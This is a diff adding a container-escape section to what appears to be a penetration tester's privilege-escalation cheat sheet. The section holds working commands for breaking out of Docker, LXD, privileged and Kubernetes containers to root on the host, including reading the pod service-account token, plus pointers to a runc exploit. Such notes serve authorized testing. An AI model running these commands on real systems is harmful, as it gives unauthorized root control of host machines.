@@ -247,6 +247,40 @@ whoami /priv                                  # look for SeImpersonate -> potato
 systeminfo                                    # then windows-exploit-suggester
 ```
 
+## Container escape
+
+```bash
+# am I in a container, and which runtime?
+ls -la /.dockerenv /run/.containerenv 2>/dev/null   # docker / podman
+cat /proc/1/cgroup                                  # docker / lxc / kubepods
+env | grep -i KUBERNETES                            # a pod
+
+# enumerate the confinement (the escape is almost always one of these)
+capsh --print 2>/dev/null; grep Cap /proc/self/status   # CAP_SYS_ADMIN / PTRACE / DAC_READ_SEARCH
+ls -la /var/run/docker.sock 2>/dev/null             # mounted socket = game over
+mount; fdisk -l 2>/dev/null                         # host mounts / privileged (sees host disks)
+id | grep -E 'docker|lxd|lxc'                        # group membership is root-equivalent
+
+# docker socket or docker group -> root on the host
+docker run -v /:/host -it alpine chroot /host bash
+
+# privileged container -> mount the host disk
+mkdir /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash
+
+# lxd group -> privileged container mounting /
+lxc init esc r -c security.privileged=true
+lxc config device add r host disk source=/ path=/mnt/root recursive=true
+lxc start r; lxc exec r sh
+
+# kubernetes pod -> node
+cat /run/secrets/kubernetes.io/serviceaccount/token
+kubectl auth can-i --list            # create pods -> schedule a privileged hostPath pod
+
+# CAP_SYS_ADMIN (AppArmor off/permissive): cgroup release_agent break-out -> HackTricks
+# CVE-2019-5736: overwrite host runc from inside, fires on the next 'docker exec'
+# automation: ./deepce.sh   |   cdk evaluate --full
+```
+
 ## Password cracking
 
 ```bash
